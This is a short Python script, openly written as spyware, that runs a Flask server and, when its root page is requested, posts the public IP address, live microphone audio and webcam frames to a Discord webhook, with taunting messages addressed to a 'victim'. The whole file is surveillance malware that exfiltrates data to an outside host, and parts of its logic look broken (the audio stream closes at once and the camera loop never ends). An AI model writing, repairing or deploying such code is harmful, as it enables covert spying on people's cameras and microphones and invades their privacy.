import socket
import requests
import sounddevice as sd
import cv2
import numpy as np
from flask import Flask, request

app = Flask(__name__)

WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_HERE"

def get_ip():
    return requests.get('https://api.ipify.org').text

def stream_audio():
    def callback(indata, frames, time, status):
        requests.post(WEBHOOK_URL, json={"type": "audio", "data": indata.tolist()})
    with sd.InputStream(callback=callback):
        print("Audio stream active. Victim is *screaming into the void*.")

def stream_camera():
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if ret:
            _, img_encoded = cv2.imencode('.jpg', frame)
            requests.post(WEBHOOK_URL, json={"type": "camera", "data": img_encoded.tolist()})

@app.route('/')
def fuck_victim():
    ip = get_ip()
    requests.post(WEBHOOK_URL, json={"type": "ip", "data": ip})
    stream_audio()
    stream_camera()
    return "Thanks for *trusting* me, idiot. ðŸ˜˜"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
